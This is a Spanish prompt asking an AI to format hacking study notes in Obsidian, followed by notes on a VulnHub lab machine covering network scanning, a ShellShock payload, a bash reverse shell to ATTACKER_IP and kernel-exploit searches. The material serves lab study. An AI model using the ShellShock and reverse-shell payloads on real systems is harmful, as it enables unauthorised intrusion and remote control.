
Quiero que actúes como un asistente especializado en mejorar y embellecer mis apuntes de **hacking y ciberseguridad** en Obsidian.

### Reglas de formato:
- Usa **Markdown** y todas las herramientas nativas de Obsidian:  
  - Encabezados jerárquicos (#, ##, ###…)  
  - Negritas, cursivas, tachado  
  - Listas ordenadas y no ordenadas  
  - Tablas para comparaciones  
  - Callouts (`> [!info]`, `> [!tip]`, `> [!warning]`, `> [!example]`, etc.)  
  - Diagramas con **Mermaid** (especialmente diagramas de redes, flujos y ataques)  
  - Bloques de código y comandos de terminal (bash, python, etc.)  
  - Separadores `---` para estructurar  

### Reglas de estilo:
- Embellecé y organizá mis notas para que sean **claras, fáciles de leer y visualmente atractivas**.  
- Si algo está enredado o difícil de entender, simplificalo y hacelo **más didáctico**.  
- Agregá **ejemplos prácticos** (comandos reales, simulaciones, casos de uso).  
- Respetá los **enlaces e imágenes** que yo incluya. No borres ni inventes enlaces/imágenes nuevas.  
- Podés usar **diagramas de red (Mermaid), tablas comparativas y listas de pasos** para explicar ataques, defensas y herramientas.  
- El resultado final debe ser un apunte **técnico, claro y útil para estudiar hacking**.  

Cuando te pase un texto, transformalo siguiendo estas reglas.

Aqui te va el texto:

---

# Explotacion de Kernel

{fundamentos teoricos}

---
practica

bajamos de vulnhub la maquina SUMO: 1 y despues lo importas a virtualbox o vmware

aplicamos uso de [[arp-scan]] para descubrir la ip de la maquina

arp-scan -I eth0 --localnet --ignoredups

> -I: interfaz de red
> --localnet: escanear toda la red local
> --ignoredups: ignorar duplicados


esta maquina primero empezaremos explotando un [[Ataque ShellShock]]
ahora probamos un descubrimiento de rutas con [[gobuster]]

gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://IPMAQUINA/ -t 20 --add-slash

> -w: wordlist
> -u: url
> -t: threads
> --add-slash: agregar / al final de las rutas, porque algunas rutas son directorios

nos aparece una ruta /cgi-bin/ que es un directorio donde se suelen alojar scripts

por lo probamos un descubrimiento de scripts con [[gobuster]]

gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://IPMAQUINA/cgi-bin/ -t 20 -x sh,pl,py,php,cgi

> -x: extensiones

podemos meter este payload

```bash
curl -H "User-Agent: () { :; }; /usr/bin/whoami" http://example.com/
```

con esto ganamos acceso a la maquina ya que podemos entablar una reverse shell

```bash
bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1
```

```bash
curl -H "User-Agent: () { :; }; /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1'" http://example.com/
```

y desde nuestro [[netcat]] escuchamos
```bash
nc -nlvp 443
```

ahora que tenemos acceso a la maquina hacemos un [[Tratamiento de TTY]]

luego   vemos que usuario somos con whoami y nos da www-data

ahora hacemos lsb_release -a para ver la version del SO
```
lsb_release -a
```
```bash
uname -a
```
esto para ver la version del kernel y vemos que tiene una version 3.2

con [[searchsploit]] buscamos exploits para esa version del kernel
```
searchsploit linux kernel 3.2
```



